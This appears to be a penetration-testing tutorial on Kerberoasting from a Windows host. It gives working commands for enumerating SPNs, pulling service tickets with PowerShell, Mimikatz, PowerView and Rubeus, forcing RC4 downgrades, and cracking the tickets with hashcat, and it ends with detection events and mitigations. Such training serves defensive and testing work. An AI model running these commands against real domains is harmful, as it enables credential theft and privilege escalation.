## Kerberoasting from Windows

This section covers three approaches to Kerberoasting from a Windows host: the semi-manual method using built-in tools and [Mimikatz](https://github.com/gentilkiwi/mimikatz), the automated route using [PowerView](https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1), and the most efficient method using [Rubeus](https://github.com/GhostPack/Rubeus). It also covers encryption type considerations that directly affect cracking time.

***

## Semi-Manual Method

### Enumerate SPNs with setspn.exe

`setspn.exe` is a built-in Windows binary. The `-Q */*` flag queries all SPNs in the domain. Focus only on user accounts in the output, not computer accounts:

```cmd
setspn.exe -Q */*
```

Example output showing target accounts:

```
CN=BACKUPAGENT,OU=Service Accounts,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL
        backupjob/veam001.inlanefreight.local
CN=sqldev,OU=Service Accounts,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL
        MSSQLSvc/DEV-PRE-SQL.inlanefreight.local:1433
```

### Request a TGS Ticket into Memory

Use PowerShell and the `System.IdentityModel.Tokens.KerberosRequestorSecurityToken` class to request a TGS ticket and load it into the current session's memory:

```powershell
Add-Type -AssemblyName System.IdentityModel
New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "MSSQLSvc/DEV-PRE-SQL.inlanefreight.local:1433"
```

To request tickets for all SPN accounts at once, pipe `setspn.exe` output through PowerShell:

```powershell
setspn.exe -T INLANEFREIGHT.LOCAL -Q */* | Select-String '^CN' -Context 0,1 | % { New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $_.Context.PostContext[0].Trim() }
```

### Extract Tickets with Mimikatz

With tickets loaded into memory, extract them using Mimikatz. Using `base64 /out:true` outputs the ticket as a base64 blob rather than writing a `.kirbi` file to disk, which can be useful for exfiltration:

```
mimikatz # base64 /out:true
mimikatz # kerberos::list /export
```

If you skip the base64 flag, Mimikatz writes `.kirbi` files directly to disk.

### Prepare for Cracking

Strip newlines from the base64 blob, convert it back to a `.kirbi` file, then use `kirbi2john.py` and `sed` to format it for Hashcat:

```bash
echo "<base64 blob>" | tr -d \\n > encoded_file
cat encoded_file | base64 -d > sqldev.kirbi
python2.7 kirbi2john.py sqldev.kirbi
sed 's/\$krb5tgs\$\(.*\):\(.*\)/\$krb5tgs\$23\$\*\1\*\$\2/' crack_file > sqldev_tgs_hashcat
hashcat -m 13100 sqldev_tgs_hashcat /usr/share/wordlists/rockyou.txt
```

***

## Automated Route with PowerView

PowerView simplifies the process significantly. First enumerate SPN accounts, then pull the TGS ticket in Hashcat-ready format in one step:

```powershell
Import-Module .\PowerView.ps1
Get-DomainUser * -spn | select samaccountname
```

Target a specific user:

```powershell
Get-DomainUser -Identity sqldev | Get-DomainSPNTicket -Format Hashcat
```

Export all tickets to a CSV for offline processing:

```powershell
Get-DomainUser * -SPN | Get-DomainSPNTicket -Format Hashcat | Export-Csv .\ilfreight_tgs.csv -NoTypeInformation
cat .\ilfreight_tgs.csv
```

***

## Automated Route with Rubeus

[Rubeus](https://github.com/GhostPack/Rubeus) is the most feature-rich option. Always use `/nowrap` to prevent base64 output from being column-wrapped, which would break the hash format.

### Gather Statistics First

Before requesting tickets, check how many accounts are Kerberoastable and what encryption types they support:

```powershell
.\Rubeus.exe kerberoast /stats
```

Example output:

```
Total kerberoastable users : 9

Supported Encryption Type          | Count
RC4_HMAC_DEFAULT                   | 7
AES128_CTS_HMAC_SHA1_96, AES256... | 2

Password Last Set Year | Count
2022                   | 9
```

Accounts with passwords set 5 or more years ago are often worth prioritising, as they may have been set when password hygiene standards were lower.

### Target High-Value Accounts

Use `/ldapfilter:'admincount=1'` to request tickets only for accounts with admin privileges:

```powershell
.\Rubeus.exe kerberoast /ldapfilter:'admincount=1' /nowrap
```

### Target a Specific User

```powershell
.\Rubeus.exe kerberoast /user:sqldev /nowrap
```

***

## Encryption Types and Cracking Time

This is one of the most important practical considerations in Kerberoasting.

| Ticket Type | Hashcat Mode | Approximate Crack Time (CPU, rockyou.txt) |
|-------------|-------------|------------------------------------------|
| RC4 (type 23) - `$krb5tgs$23$*` | `13100` | 4 seconds |
| AES-256 (type 18) - `$krb5tgs$18$*` | `19700` | 4 minutes 36 seconds |

The `msDS-SupportedEncryptionTypes` attribute on the account controls which encryption type the DC issues:

```powershell
Get-DomainUser testspn -Properties samaccountname,serviceprincipalname,msds-supportedencryptiontypes
```

- A value of `0` means RC4 is used by default
- A value of `24` means only AES-128/256 are supported

### Downgrading from AES to RC4

Even if an account has AES enabled, Rubeus can force an RC4 ticket by using the `/tgtdeleg` flag. This works because the tool specifies RC4 as the only supported algorithm in the TGS request body:

```powershell
.\Rubeus.exe kerberoast /user:testspn /tgtdeleg /nowrap
```

This cuts cracking time from minutes to seconds on a CPU, and from days to hours on a GPU rig. Note: this downgrade does NOT work against Windows Server 2019 Domain Controllers. A Server 2019 DC will always return a ticket encrypted at the highest level the account supports, regardless of what the requester asks for.

***

## Detection and Mitigation

Kerberoasting generates Event ID `4769` (Kerberos service ticket requested) and `4770` (Kerberos service ticket renewed). Ten to twenty such requests per account per day is normal. A sudden burst of `4769` events from a single account in a short window is a strong indicator of Kerberoasting. The ticket encryption type in the event log entry will show `0x17` (hex for 23) for RC4 requests.

Recommended mitigations:

- Use [Managed Service Accounts (MSA)](https://docs.microsoft.com/en-us/windows-server/security/group-managed-service-accounts/group-managed-service-accounts-overview) or [Group Managed Service Accounts (gMSA)](https://docs.microsoft.com/en-us/windows-server/security/group-managed-service-accounts/group-managed-service-accounts-overview), which rotate automatically with very complex passwords
- Enforce long, complex passwords (25+ characters) on any account that must have an SPN
- Never place SPN accounts in Domain Admins or other highly privileged groups
- Enable auditing for Kerberos Service Ticket Operations via Group Policy (`Audit Kerberos Service Ticket Operations`)
- Consider restricting RC4 encryption, but test thoroughly before implementing as it can break legacy services
